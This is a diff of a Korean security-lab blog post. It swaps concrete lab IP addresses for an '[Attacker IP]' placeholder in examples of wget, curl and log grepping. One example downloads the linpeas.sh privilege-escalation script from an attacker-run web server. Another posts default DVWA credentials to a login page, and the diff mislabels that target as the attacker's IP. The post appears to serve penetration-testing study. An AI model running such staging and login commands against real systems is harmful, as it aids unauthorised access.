@@ -66,8 +66,8 @@ categories: [시스템 해킹]
         *   `-q`: 다운로드 과정을 출력하지 않는다 (Quiet).
         *   `-O <file>`: 다운로드한 내용을 지정된 파일 이름으로 저장한다. (`-O -`는 표준 출력으로 보냄)
     ```bash
-    # 공격자 PC(192.9.200.12)에서 실행 중인 웹 서버로부터 linpeas.sh를 다운로드
-    wget http://192.9.200.12:8000/linpeas.sh
+    # 공격자 PC에서 실행 중인 웹 서버로부터 linpeas.sh를 다운로드
+    wget http://[Attacker IP]:8000/linpeas.sh
     ```
 *   **curl**: URL을 통해 데이터를 전송하고 그 결과를 터미널에 직접 출력한다. 파일 저장 없이 API 응답을 확인하거나 웹 페이지 소스를 분석할 때 유용하다.
     *   **주요 옵션:**
@@ -75,7 +75,7 @@ categories: [시스템 해킹]
         *   `-d <data>`: `POST` 요청 시 전송할 데이터를 지정한다.
     ```bash
     # DVWA 로그인 페이지에 POST 요청을 보내고 응답을 확인
-    curl -X POST -d "username=admin&password=password&Login=Login" http://192.9.200.11/login.php
+    curl -X POST -d "username=admin&password=password&Login=Login" http://[Attacker IP]/login.php
     ```
 
 ### 5. 기본 로그 분석
@@ -93,9 +93,9 @@ categories: [시스템 해킹]
     grep "Failed password" /var/log/auth.log
     ```
 *   **특정 IP의 웹 서버 접근 기록 확인:**
-    `access.log`에서 특정 IP(`192.9.200.12`)의 접근 기록을 필터링한다.
+    `access.log`에서 특정 IP의 접근 기록을 필터링한다.
     ```bash
-    grep "192.9.200.12" /var/log/apache2/access.log
+    grep "[Attacker IP]" /var/log/apache2/access.log
     ```
 
 이러한 로그 분석은 [A09: 보안 로깅 및 모니터링 실패](https://hamap0.github.io/projects/owasp-top-10/2025/09/02/A09_Security-Logging-and-Monitoring-Failures.html) 프로젝트에서 로그의 중요성을 이해하는 기반이 된다.
